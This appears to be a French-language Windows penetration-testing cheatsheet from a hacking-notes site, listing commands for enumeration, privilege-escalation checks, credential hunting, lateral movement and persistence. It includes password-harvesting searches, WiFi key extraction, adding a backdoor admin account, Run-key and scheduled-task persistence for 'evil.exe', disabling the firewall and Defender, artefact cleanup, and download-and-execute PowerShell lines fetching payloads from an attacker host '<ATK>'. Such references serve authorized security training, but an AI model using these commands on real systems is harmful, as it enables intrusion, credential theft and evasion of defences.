# Windows Cheatsheet

Référence rapide des commandes Windows essentielles en pentest énumération, privilèges, persistence et mouvement latéral.


## Informations Système

::: code-group
```cmd [Système]
 # Info système complète
 systeminfo

 # Nom de la machine
 hostname

 # Version Windows
 winver
 ver

 # Architecture
 echo %PROCESSOR_ARCHITECTURE%
```
```powershell [PowerShell]
 # Info système
 Get-ComputerInfo

 # Version OS
 [System.Environment]::OSVersion

 # Uptime
 (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
```

:::


## Utilisateurs & Groupes

::: code-group
```cmd [Utilisateurs locaux]
 # Lister les utilisateurs
 net user

 # Détails d'un utilisateur
 net user <username>

 # Utilisateur actuel
 whoami
 whoami /all
 whoami /priv
 whoami /groups
```
```cmd [Groupes locaux]
 # Lister les groupes
 net localgroup

 # Membres d'un groupe
 net localgroup Administrators
 net localgroup "Remote Desktop Users"
```
```cmd [Domaine]
 # Utilisateurs du domaine
 net user /domain
 net user <username> /domain

 # Groupes du domaine
 net group /domain
 net group "Domain Admins" /domain

 # Contrôleurs de domaine
 net group "Domain Controllers" /domain
 nltest /dclist:<domain>
```
```powershell [PowerShell]
 # Utilisateurs locaux
 Get-LocalUser
 Get-LocalGroup
 Get-LocalGroupMember Administrators

 # Utilisateur courant
 [System.Security.Principal.WindowsIdentity]::GetCurrent()
```

:::


## Réseau

::: code-group
```cmd [Interfaces & Routes]
 # Interfaces réseau
 ipconfig /all

 # Table de routage
 route print

 # ARP cache
 arp -a

 # Connexions actives
 netstat -ano
 netstat -anob

 # Ports en écoute
 netstat -ano | findstr LISTENING
```
```cmd [DNS & Ping]
 # Résolution DNS
 nslookup <domain>
 nslookup <domain> <dns-server>

 # Ping
 ping <target>
 ping -n 1 <target>

 # Traceroute
 tracert <target>
```
```powershell [PowerShell]
 # Interfaces
 Get-NetIPAddress
 Get-NetAdapter

 # Connexions
 Get-NetTCPConnection
 Get-NetTCPConnection -State Listen

 # Routes
 Get-NetRoute

 # DNS
 Resolve-DnsName <domain>
```

:::


## Processus & Services

::: code-group
```cmd [Processus]
 # Lister les processus
 tasklist
 tasklist /v
 tasklist /svc

 # Tuer un processus
 taskkill /PID <pid>
 taskkill /IM <process.exe> /F

 # Processus par port
 netstat -ano | findstr <port>
 tasklist | findstr <pid>
```
```cmd [Services]
 # Lister les services
 sc query
 sc query state= all
 net start

 # Détails d'un service
 sc qc <service>

 # Démarrer / Arrêter
 net start <service>
 net stop <service>

 # Modifier un service
 sc config <service> binpath= "C:\Temp\evil.exe"
```
```powershell [PowerShell]
 # Processus
 Get-Process
 Get-Process | Sort-Object CPU -Descending

 # Services
 Get-Service
 Get-Service | Where-Object {$_.Status -eq "Running"}
 Start-Service <service>
 Stop-Service <service>
```

:::


## Fichiers & Répertoires

::: code-group
```bash [Navigation]
 # Lister les fichiers
 dir
 dir /a
 dir /s /b *.txt

 # Rechercher un fichier
 where <filename>
 dir /s /b <filename>

 # Chercher dans les fichiers
 findstr /si "password" *.txt *.xml *.config

 # Copier / Déplacer
 copy source dest
 move source dest
 xcopy /s source dest
 robocopy source dest /e
```
```bash [PowerShell]
 # Lister
 Get-ChildItem
 Get-ChildItem -Hidden
 Get-ChildItem -Recurse -Filter *.txt

 # Rechercher contenu
 Select-String -Path C:\* -Pattern "password" -Recurse

 # Copier
 Copy-Item source dest -Recurse
```

:::


## Registre

::: code-group
```cmd [cmd]
 # Lire une clé
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion

 # Chercher dans le registre
 reg query HKLM /f "password" /t REG_SZ /s

 # Modifier une valeur
 reg add HKLM\...\Run /v evil /t REG_SZ /d "C:\Temp\evil.exe"

 # Supprimer une valeur
 reg delete HKLM\...\Run /v evil /f
```
```powershell [PowerShell]
 # Lire
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion

 # Chercher
 Get-ChildItem -Path HKLM:\ -Recurse | Get-ItemProperty | Select-String "password"
```

:::


## Enumération Privilege Escalation

### Informations clés
```cmd
 # Droits de l'utilisateur courant
 whoami /priv
 whoami /all

 # Politique de mots de passe
 net accounts

 # Partages réseau
 net share

 # Sessions actives
 net session

 # Tâches planifiées
 schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v | findstr "Task Name\|Run As\|Task To Run"

 # Programmes installés
 wmic product get name,version
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

### Recherche de fichiers sensibles
```cmd
 # Fichiers de configuration
 dir /s /b C:\*.config
 dir /s /b C:\*.xml
 dir /s /b C:\*.ini
 dir /s /b C:\*.txt

 # Passwords dans les fichiers
 findstr /si "password" C:\*.txt C:\*.xml C:\*.config C:\*.ini

 # Fichiers récents
 dir /od /tw C:\Users\%username%\Desktop
 dir /od /tw C:\Users\%username%\Documents

 # Fichiers non quotés dans les services
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

### Permissions
```cmd
 # Permissions sur un fichier
 icacls C:\path\to\file

 # Permissions sur un dossier
 icacls C:\path\to\dir

 # Permissions sur un service
 sc sdshow <service>
 accesschk.exe -ucqv <service>
```


## Credential Hunting
```cmd
 # Credentials stockés
 cmdkey /list
 vaultcmd /listcreds:"Windows Credentials"

 # WiFi passwords
 netsh wlan show profiles
 netsh wlan show profile name="<SSID>" key=clear

 # Fichiers de config courants
 type C:\Windows\System32\drivers\etc\hosts
 type C:\Windows\win.ini
 type C:\inetpub\wwwroot\web.config

 # Historique PowerShell
 type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

 # Recherche passwords
 findstr /si "password\|passwd\|pwd\|secret\|credentials" C:\Users\*.txt
 findstr /si "password\|passwd\|pwd\|secret\|credentials" C:\Users\*.xml
 findstr /si "password\|passwd\|pwd\|secret\|credentials" C:\Users\*.config
```


## Lateral Movement

::: code-group
```cmd [PSExec]
 # Shell distant
 PsExec.exe \\<target> cmd
 PsExec.exe \\<target> -u user -p password cmd
```
```powershell [WMI]
 # Exécuter une commande
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" -ComputerName <target>

 # Avec credentials
 $cred = Get-Credential
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" -ComputerName <target> -Credential $cred
```
```powershell [WinRM]
 # Session interactive
 Enter-PSSession -ComputerName <target> -Credential (Get-Credential)

 # Exécuter une commande
 Invoke-Command -ComputerName <target> -ScriptBlock { whoami } -Credential (Get-Credential)
```
```cmd [RDP]
 # Activer RDP
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow

 # Connexion RDP
 mstsc /v:<target>
```

:::


## Persistence

::: code-group
```cmd [Registry Run]
 # Ajouter au démarrage
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\Temp\evil.exe" /f

 # System-wide
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\Temp\evil.exe" /f
```
```cmd [Tâche planifiée]
 # Créer une tâche
 schtasks /create /tn "evil" /tr "C:\Temp\evil.exe" /sc onlogon /ru System

 # Avec trigger horaire
 schtasks /create /tn "evil" /tr "C:\Temp\evil.exe" /sc hourly /ru System

 # Supprimer
 schtasks /delete /tn "evil" /f
```
```cmd [Service]
 # Créer un service
 sc create evil binpath= "C:\Temp\evil.exe" start= auto
 sc start evil

 # Supprimer
 sc stop evil
 sc delete evil
```
```cmd [Compte admin]
 # Ajouter un utilisateur
 net user hacker Password123! /add
 net localgroup Administrators hacker /add

 # Activer le compte Administrateur
 net user Administrator /active:yes
 net user Administrator Password123!
```

:::


## Firewall & Antivirus
```cmd
 # Statut du firewall
 netsh advfirewall show allprofiles

 # Désactiver le firewall
 netsh advfirewall set allprofiles state off

 # Ajouter une règle
 netsh advfirewall firewall add rule name="evil" protocol=TCP dir=in localport=4444 action=allow

 # Statut Windows Defender
 sc query WinDefend
 Get-MpComputerStatus

 # Désactiver Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
```


## Encodage & Execution PowerShell
```powershell
 # Bypass ExecutionPolicy
 powershell -ExecutionPolicy Bypass -File script.ps1
 powershell -ep bypass

 # Encodage base64
 $cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://<ATK>/shell.ps1")'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 $encoded = [Convert]::ToBase64String($bytes)
 powershell -EncodedCommand $encoded

 # Execution en mémoire
 IEX (New-Object Net.WebClient).DownloadString('http://<ATK>/script.ps1')

 # Download + Execute
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATK>/file.exe','C:\Temp\file.exe'); Start-Process 'C:\Temp\file.exe'"
```


::: info Tips 

- Toujours vérifier `whoami /priv` en premier les privilèges `SeImpersonatePrivilege` ou `SeDebugPrivilege` sont souvent exploitables
- `findstr /si "password"` est la commande la plus rentable pour trouver des credentials rapidement
- Vérifier l'historique PowerShell souvent oublié et plein de credentials
- Les services avec des chemins non quotés (`Unquoted Service Path`) sont un vecteur classique d'escalade
- `cmdkey /list` révèle souvent des credentials d'administrateur sauvegardés
- Nettoyer les artefacts : historique cmd (`doskey /reinstall`), historique PS, fichiers temporaires

:::

## Notes
```
 # Notes terrain
```


## Ressources

- [HackTricks Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [LOLBAS Living off the Land](https://lolbas-project.github.io/)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)




<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/windows.md)</span>

</div>